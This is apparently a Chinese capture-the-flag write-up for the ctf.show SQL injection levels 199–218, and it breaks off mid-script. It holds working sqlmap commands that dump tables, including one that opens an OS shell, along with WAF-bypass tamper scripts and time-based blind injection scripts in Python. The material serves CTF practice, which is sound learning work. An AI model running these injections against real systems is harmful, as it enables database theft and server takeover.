class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我选离谱方法：</p><pre class="line-numbers language-none"><code class="language-none"># @Author:Y4tacker# username&#x3D;0;show tables;# pass&#x3D;ctfshow_user<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>199，200</strong></p><p>只有离谱方法能用了</p><p><strong>201</strong></p><p>sqlmap使用开始</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;查库sqlmap -u &quot;http:&#x2F;&#x2F;212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --dbs&#x2F;&#x2F;查表sqlmap -u &quot;http:&#x2F;&#x2F;212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables&#x2F;&#x2F;查字段 sqlmap -u &quot;http:&#x2F;&#x2F;212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns&#x2F;&#x2F;查值sqlmap -u &quot;http:&#x2F;&#x2F;212b52c9-db7a-4a4b-9b07-d23bb1989fc5.challenge.ctf.show&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C id,pass,username --dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>202</strong></p><p>使用POST请求，添加–data参数来设置</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;84e4c090-49b9-47dd-a749-2b144bba6ff5.challenge.ctf.show&#x2F;api&#x2F; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>203</strong></p><p>调整请求方式，此处调整为PUT请求，记得加上Content-Type不然会变表单提交</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;86418dcd-b385-474c-b132-554a8ee6a95d.challenge.ctf.show&#x2F;api&#x2F;index.php --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>204</strong></p><p>加上cookie，用–cookie</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;024304b8-be6a-48da-bc31-a8fcb796f2e8.challenge.ctf.show&#x2F;api&#x2F;index.php --cookie&#x3D;&quot;UM_distinctid&#x3D;17ff4d2091576a-09cf5f45e352f9-113f645d-384000-17ff4d209161689; PHPSESSID&#x3D;honuvgjau5711m3j9tn84hloip; ctfshow&#x3D;2e0d6ee1573392a73c0cca1476342faa&quot; --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>205</strong></p><p>提示api鉴权，发现请求前会先对一个url进行调用</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-10" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 21.53.17.png)</p><p>使用如下两个参数</p><pre class="line-numbers language-none"><code class="language-none">--safe-url 设置在测试目标地址前访问的安全链接--safe-freq 设置两次注入测试前访问安全链接的次数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>最终命令<del>悄悄换表名和列名真的可恶</del></p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show&#x2F;api&#x2F;index.php --safe-url&#x3D;&quot;http:&#x2F;&#x2F;685993ca-1d7f-4372-b50e-2bfc278ae33e.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_flaxc -C flagv --dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>206</strong></p><p>提示SQL需要闭合，<del>当我sqlmap傻是吧</del>，同上即可</p><p><strong>207</strong></p><p>–tamper 的初体验</p><p><span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/whatday/article/details/54774043" >tamper总结</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击，–tamper=TAMPER 利用给定的脚本进行篡改注入数据，该题过滤了空格，使用自带的space2comment.py即可绕过</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show&#x2F;api&#x2F;index.php --safe-url&#x3D;&quot;http:&#x2F;&#x2F;894488fd-6cfa-4392-aefa-61f64467a37c.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump --tamper&#x3D;&quot;space2comment.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>208</strong></p><p>过滤了小写的select，但是sqlmap中所有SELECT都是大写，同上即可</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show&#x2F;api&#x2F;index.php --safe-url&#x3D;&quot;http:&#x2F;&#x2F;d6087ca0-43f5-417e-8fe2-b620a9fda955.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --referer&#x3D;&quot;ctf.show&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump --tamper&#x3D;&quot;space2comment.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>209</strong></p><p>过滤了空格，*和=，讲道理使用bluecoat.py就行，但是出不来，只能自己编写脚本替换了，将空格用%09替换，=用LIKE替换</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;477c2806-7230-462f-adac-0213ba40f10f.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flav -C ctfshow_flagx,id,tes --dump --batch --tamper web209.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#web209.py</span><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal <span class="token operator">=</span> <span class="token string">""</span>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span>                    retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'='</span><span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'like'</span> <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span>                retVal <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token number">0x9</span><span class="token punctuation">)</span>                <span class="token keyword">continue</span>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    <span class="token keyword">return</span> retVal<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>210</strong></p><p>对字符串进行base64解码反转再解码，那就编码反转再编码</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;557cc437-11cc-423f-908a-43fd7aa8b33e.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flavi -C ctfshow_flagxx --dump --batch --tamper web210.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#web210.py</span><span class="token comment">#!/usr/bin/env python</span><span class="token triple-quoted-string string">"""Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)See the file 'LICENSE' for copying permission"""</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY<span class="token keyword">import</span> base64__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW<span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    retVal <span class="token operator">=</span> payload    <span class="token keyword">if</span> payload<span class="token punctuation">:</span>        retVal<span class="token operator">=</span>retVal<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        retVal<span class="token operator">=</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        retVal<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span>        retVal<span class="token operator">=</span>retVal<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        retVal<span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>retVal<span class="token punctuation">)</span>    <span class="token keyword">return</span> retVal<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>211</strong></p><p>相比于上题多过滤了空格，加上space2commit脚本即可</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;5202066d-7531-4be8-8cff-4ae5052a88a4.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web --tables --dump --batch --tamper&#x3D;&quot;space2commit.py,web210.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>212</strong></p><p>前两个加起来</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;fea29546-5555-4d19-a7fa-63d86e7eb6b8.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web --tables --dump --batch --tamper&#x3D;&quot;web209.py,web210.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>213</strong></p><p>一键getshell，–os-shell</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -u http:&#x2F;&#x2F;18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show&#x2F;api&#x2F;index.php --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; --method&#x3D;&quot;PUT&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;18f74fd7-e863-4171-a825-d896a079c1f3.challenge.ctf.show&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web --tables --os-shell --dump --batch --tamper&#x3D;&quot;web209.py,web210.py&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>214</strong></p><p>时间盲注开始</p><p>首页发现网络流量中有select.js，查看代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">layui<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'element'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">var</span> element <span class="token operator">=</span> layui<span class="token punctuation">.</span>element<span class="token punctuation">;</span>  element<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'tab(nav)'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>$<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>      <span class="token literal-property property">url</span><span class="token operator">:</span><span class="token string">'api/'</span><span class="token punctuation">,</span>      <span class="token literal-property property">dataType</span><span class="token operator">:</span><span class="token string">"json"</span><span class="token punctuation">,</span>      <span class="token literal-property property">type</span><span class="token operator">:</span><span class="token string">'post'</span><span class="token punctuation">,</span>      <span class="token literal-property property">data</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">ip</span><span class="token operator">:</span>returnCitySN<span class="token punctuation">[</span><span class="token string">"cip"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token literal-property property">debug</span><span class="token operator">:</span><span class="token number">0</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>发现提交的表单中有两个变量，测试一下</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-12" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-12</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 14.27.34.png)</p><p>测试成功，开始编写代码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://7a5edb92-03ea-49ff-bd27-30b753229c99.challenge.ctf.show/api/"</span>flagchar<span class="token operator">=</span><span class="token string">"-&#123;&#125;,qwertyuiopasdfghjklzxcvbnm_1234567890"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token comment">#'ip': f'1 or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagx"),&#123;i&#125;,1))="&#123;j&#125;",sleep(3),1)',</span><span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'1 or if((substr((select group_concat(flaga) from ctfshow_flagx),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(3),1)'</span></span><span class="token punctuation">,</span><span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>215</strong></p><p>单引号闭合</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://59e08013-c379-4607-a6bf-c11d5c4d6d6e.challenge.ctf.show/api/"</span>flagchar<span class="token operator">=</span><span class="token string">"-&#123;&#125;,flagqwertyuiopsdhjkzxcvbnm_1234567890"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token comment">#'ip': f'1\' or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))="&#123;j&#125;",sleep(3),1)#',</span><span class="token comment">#'ip': f'1\' or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagxc"),&#123;i&#125;,1))="&#123;j&#125;",sleep(3),1)#',</span><span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'1\' or if((substr((select group_concat(flagaa) from ctfshow_flagx),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(3),1)#'</span></span><span class="token punctuation">,</span><span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>216</strong></p><p>base64编码</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://fe2f1a17-e483-4137-b85d-9fa3a6daaa18.challenge.ctf.show/api/"</span>flagchar<span class="token operator">=</span><span class="token string">"-&#123;&#125;,ctfshowlagbde1234567890"</span>namechar<span class="token operator">=</span><span class="token string">",ctfshow_qwertyuiopasdfghjklzxcvbnm"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagchar<span class="token punctuation">:</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token comment">#'ip': f'"MQ==") or if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))="&#123;j&#125;",sleep(2),1)#',</span><span class="token comment">#'ip': f'"MQ==") or if((substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="ctfshow_flagxcc"),&#123;i&#125;,1))="&#123;j&#125;",sleep(2),1)#',</span><span class="token string">'ip'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'"MQ==") or if((substr((select group_concat(flagaac) from ctfshow_flagxcc),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))="</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">",sleep(2),1)#'</span></span><span class="token punctuation">,</span><span class="token string">'debug'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">&#125;</span><span class="token keyword">try</span><span class="token punctuation">:</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token keyword">except</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>217</strong></p><p>sleep不能用了啦，都ctfshow害得啦，拜托，换benchmark</p><pre class="line-numbers language-none"><code class="language-none">import requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e7d85700-c8a1-48c2-bea8-4ead2e0976b4.challenge.ctf.show&#x2F;api&#x2F;&quot;flagchar &#x3D; &quot;-&#123;&#125;,ctfshowlagbde1234567890&quot;namechar &#x3D; &quot;,ctfshow_qwertyuiopasdfghjklzxcvbnm&quot;for i in range(1, 1000):    for j in flagchar:        data &#x3D; &#123;            #&#39;ip&#39;: f&#39;1) or if(((substr((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;i&#125;,1))&#x3D;\&#39;&#123;j&#125;\&#39;),(benchmark(20000000,sha(1))),1)#&#39;,            #&#39;ip&#39;: f&#39;1) or if(((substr((select group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&quot;ctfshow_flagxccb&quot;),&#123;i&#125;,1))&#x3D;\&#39;&#123;j&#125;\&#39;),(benchmark(20000000,sha(1))),1)#&#39;,            &#39;ip&#39;: f&#39;1) or if(((substr((select group_concat(flagaabc) from ctfshow_flagxccb),&#123;i&#125;,1))&#x3D;\&#39;&#123;j&#125;\&#39;),(benchmark(20000000,sha(1))),1)#&#39;,            &#39;debug&#39;: &#39;1&#39;        &#125;        try:            requests.post(url&#x3D;url, data&#x3D;data, timeout&#x3D;4)        except:            print(j, end&#x3D;&#39;&#39;)            break<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>218</strong></p><p>benchmark也🈚️了，换笛卡尔积</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://de5b41b6-9f89-4e0a-b913-7c33a143979a.challenge.ctf.show/api/"</span>flagchar <span class="token operator">=</span> <span class="token string">"-&#123;&#125;,abcdef1234567890"</span>namechar <span class="token operator">=</span> <span class="token string">",ctfshow_qwertyuiopasdfghjklzxcvbnm"</span><span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token 